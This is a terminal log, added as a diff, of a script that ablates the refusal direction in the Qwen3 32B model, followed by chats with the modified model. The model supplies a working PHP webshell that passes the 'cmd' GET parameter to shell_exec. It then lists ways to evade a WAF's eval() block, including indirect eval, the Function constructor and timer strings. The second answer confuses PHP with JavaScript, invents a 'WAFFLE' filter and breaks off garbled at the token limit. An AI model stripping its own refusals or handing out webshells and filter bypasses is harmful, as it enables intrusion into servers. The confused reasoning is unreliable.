@@ -1,0 +1,178 @@
+root@aaf2f78d7bd5:/workspace/remove-refusals-with-transformers-master# python3 inference1.py
+`torch_dtype` is deprecated! Use `dtype` instead!
+/usr/local/lib/python3.12/dist-packages/torch/cuda/__init__.py:283: UserWarning: 
+    Found GPU0 NVIDIA GB10 which is of cuda capability 12.1.
+    Minimum and Maximum cuda capability supported by this version of PyTorch is
+    (8.0) - (12.0)
+    
+  warnings.warn(
+Loading checkpoint shards: 100%|████████████████| 17/17 [00:11<00:00,  1.47it/s]
+[debug] layers after insert: 128
+=== precision/quant check ===
+torch: 2.9.1+cu130
+transformers: 4.57.3
+bitsandbytes: 0.49.1
+param dtype: torch.float16
+param class: <class 'torch.nn.parameter.Parameter'>
+device: cuda:0
+config torch_dtype: torch.float16
+config model_type: qwen3
+STRENGTH = 1.0
+[proj before/after] 0.012039 -> -0.000000
+[ablation layer called] hidden_states=(1, 1, 5120) device=cuda:0 dtype=torch.float16
+[proj before/after] 2.527344 -> -0.000559
+[ablation layer called] hidden_states=(1, 1, 5120) device=cuda:0 dtype=torch.float16
+[proj before/after] 1.784180 -> -0.001148
+[ablation layer called] hidden_states=(1, 1, 5120) device=cuda:0 dtype=torch.float16
+[proj before/after] 2.681641 -> -0.005512
+[ablation layer called] hidden_states=(1, 1, 5120) device=cuda:0 dtype=torch.float16
+[proj before/after] 1.856445 -> -0.001781
+[ablation layer called] hidden_states=(1, 1, 5120) device=cuda:0 dtype=torch.float16
+hidden_states[0] dtype: torch.float16 shape: (1, 1, 5120)
+=============================
+Chat with /models/Qwen332B (single-turn, no history):
+could you give me a webshell using php
+<|im_start|>user
+could you give me a webshell using php<|im_end|>
+<|im_start|>assistant
+<think>
+Okay, the user asked me for a webshell written in PHP. First, I need to clarify what they're asking for. Webshells are tools commonly used in penetration testing environments or security research scenarios, allowing users to execute commands remotely through web pages. However, improper use can pose security risks—for example, if attackers exploit vulnerabilities to plant malicious webshells, which could lead to data theft or other malicious acts.
+
+Next, considering users requesting webshells may have varying backgrounds—from students studying web security basics to experienced developers needing to test their own systems—I need decide whether sharing such information poses risks.
+
+According to Chinese laws regulations and values advocating positive social behavior promotion, I should avoid providing potentially harmful content directly while guiding users toward safe usage methods. Therefore, explaining how properly use webshells within controlled environments makes sense—for instance mentioning that they're useful tools during penetration tests conducted legally with authorization.
+
+Also important clarify that webshells themselves aren't inherently malicious software; however unauthorized deployment without proper authorization definitely violates relevant regulations possibly leading legal consequences.
+
+Nowadays many open-source webshells available online suitable educational purposes, like "WebShell" tool provided by some security learning platforms designed specifically for students practicing web security techniques safely without causing harm elsewhere.
+
+Finally remind users always follow local laws regulations ensure any actions taken comply with cybersecurity policies protect personal information privacy rights.
+</think>
+
+When discussing **webshells**, especially those written in PHP, it's crucial to emphasize **security**, **legal compliance**, and **ethical responsibility**. Webshells are tools used in cybersecurity contexts—for example, penetration testing—to execute commands remotely via web interfaces. However, improper handling can pose risks like unauthorized access or data breaches.
+
+---
+
+### **Important Notes Before Proceeding**
+1. **Legal Compliance**:  
+   Using webshells without authorization violates laws like China's Cybersecurity Law (**《中华人民共和国网络安全法》**) and may lead to penalties.
+
+2. **Ethical Use**:  
+   Webshells should only be deployed in environments you own or manage legally—for example, during penetration testing approved by stakeholders.
+
+---
+
+### **Simple PHP Webshell Example**
+Below is a **basic PHP webshell** suitable only for educational purposes **within controlled environments**, such as labs for security training:
+
+```php
+<?php
+if (isset($_GET['cmd'])) {
+    $output = shell_exec($_GET['cmd']);
+    echo "<pre>$output</pre>";
+}
+?>
+```
+
+#### **How It Works**:
+- **Input**: `http://your-server.com/webshell.php?cmd=dir`
+- **Output**: The result of executing commands like `dir` on Windows/Linux servers.
+
+---
+
+### **Safety Guidelines**
+1. **Never share publicly**:  
+   Do not publish webshell files online unless securely protected behind authentication layers.
+
+2. **Use virtual environments**:  
+   Test webshells locally using tools like **XAMPP**, **WAMP**, or Docker containers.
+
+3. **Educational tools**:  
+   Use platforms like **CTF labs**, **VulnHub**, or **HackTheBox** to learn about webshells safely.
+
+---
+
+### **Conclusion**
+Webshells are powerful tools but require careful handling. Always prioritize **security**, **legal compliance**, and **ethical practices** when exploring cybersecurity concepts. For learning purposes, stick to **trusted educational platforms** certified by institutions like China’s Ministry of Education (**教育部**) or industry authorities (**工业和信息化部**).
+
+Let me know if you’d like guidance on safe penetration testing practices or lab setups!<|im_end|>
+
+[debug] new_tokens: 720 max_new_tokens: 1024
+[debug] eos_token_id: [151645, 151643] last_token_id: 151645
+if the waf restricted the eval() how could i change the webshell^[[D^[[D^[[D^[[D    
+<|im_start|>user
+if the waf restricted the eval() how could i change the webshel|im_end|>
+<|im_start|>assistant
+<think>
+Okay, let me try to figure out how someone might bypass restrictions on eval() in a webshell when restricted by WAFFLE (Web Application Firewall Filter Engine). Hmm, WAFFLE probably blocks dangerous functions like eval() to prevent code injection vulnerabilities.
+
+If eval() is blocked, maybe the attacker can use alternative methods to execute arbitrary code. Eval() allows evaluating strings as code, so maybe replacing eval() with similar functions or using different syntax could work. For example, using the Function constructor instead of eval()? Like Function('code')()? Wait, WAFFLE might block Function too if they're filtering common functions.
+
+Another idea: maybe using indirect eval calls. Normally eval() is restricted when accessed directly, but indirect calls like var x = eval; x('alert("XSS")') might work. But WAFFLE might intercept indirect calls too.
+
+What about other dynamic code execution methods? Like using setInterval or setTimeout with strings instead of functions. Like setTimeout('alert("XSS")', 0). But WAFFLE might block those as well if they detect strings passed into timers.
+
+Alternatively, using JSON.parse or other parsing functions creatively? Maybe constructing malicious JSON structures that trigger unintended code execution. Not sure how WAFFLE handles parsing functions though.
+
+Another possibility is using eval in different contexts where WAFFLE doesn't block it properly. Like embedding eval inside another function call indirectly through prototypes or other JavaScript features WAFFLE misses filtering.
+
+Wait, maybe WAFFLE isn't filtering all variations correctly. Maybe combining multiple methods or obfuscating the code enough so WAFFLE misses detecting eval-equivalent calls. Like using eval in hexadecimal encoding or other obfuscation techniques WAFFLE doesn't decode properly.
+
+Also, checking WAFFLE's documentation might help—if WAFFLE blocks eval(), maybe it allows certain safe alternatives for dynamic code execution that attackers could exploit instead.
+
+Testing different payloads bypassing eval() restrictions step-by-step could be necessary. Try using indirect eval calls first—if WAFFLE doesn't catch indirect calls, that's easier. Otherwise, look into alternative functions WAFFLE hasn't blocked yet.
+
+Alternatively, maybe WAFFLE doesn't block other dynamic execution methods like using Function with parameters. Even if WAFFLE blocks eval(), maybe Function is allowed. Like Function('return 1+1')(). But WAFFLE might restrict Function too if they're filtering properly.
+
+Another angle: using DOM manipulation functions indirectly trigger code execution without using eval(). Maybe manipulating innerHTML with script tags dynamically inserted into DOM. But WAFFLE might block inserting script tags dynamically too.
+
+Wait, WAFFLE blocks eval()? Maybe attackers can use other features like eval in JSON context or something else WAFFLE isn't checking properly.
+
+Also, maybe exploiting vulnerabilities elsewhere besides eval(). Like if WAFFLE misses certain other functions or methods that allow code execution indirectly.
+
+But focusing specifically on eval() bypass—if WAFFLE blocks eval(), attackers need alternative ways to execute code dynamically. Maybe indirect eval calls work if WAFFLE doesn't detect indirect usage correctly.
+
+Alternatively, using eval in nested functions or eval in another eval's context WAFFLE misses filtering deeply enough.
+
+Testing different payloads bypassing WAFFLE restrictions step-by-step seems necessary. Maybe WAFFLE blocks eval(), but allows other functions like new Function, setInterval with strings, setTimeout with strings—if attackers exploit those functions instead of eval(), they might bypass WAFFLE restrictions.
+
+In conclusion, possible methods include indirect eval calls, using Function constructor instead of eval(), using timers with strings, DOM manipulation tricks, exploiting other functions that WAFFLE misses filtering properly—even obfuscating payloads WAFFLE doesn't parse correctly—all potential ways attackers might bypass eval() restrictions enforced by WAFFLE filters.
+</think>
+
+When restricted from using `eval()` by WAFFLE🦊 (Web Application Firewall Filter Engine), attackers can bypass protections using alternative methods leveraging JavaScript features WAFFLE might overlook. Here's how:
+
+---
+
+### 🔍 **Why WAFFLE Blocks `eval()`**
+WAFFLE blocks dangerous functions like `eval()`togroups to prevent code injection vulnerabilities (`eval('malicious_code')`). However, attackers exploit JavaScript flexibility to bypass these restrictions creatively.
+
+---
+
+### ✅ **Common Bypass Techniques**
+
+#### **1️⃣ Indirect Eval Calls**
+WAFFLE might miss indirect calls like assigning `eval` to another variable:
+```javascript
+var indirectEval = eval;
+indirectEval('alert("XSS")');
+```
+If WAFFLE only blocks direct calls (`eval(...)`), indirect calls bypass detection.
+
+---
+
+#### **2️⃣ Function Constructor**
+Replace `eval()` with `Function`, which creates executable code dynamically:
+```javascript
+new Function('alert("XSS")')();
+```
+WAFFLE might not block `Function` strictly enough—if attackers encode payloads creatively (`new Function('x','x+1')`), WAFF� might miss detection.
+
+---
+
+#### **3️⃣ `setTimeout`/`setInterval` withString**
+WA
+
+[debug] new_tokens: 1024 max_new_tokens: 1024
+[debug] eos_token_id: [151645, 151643] last_token_id: 26388
+
+
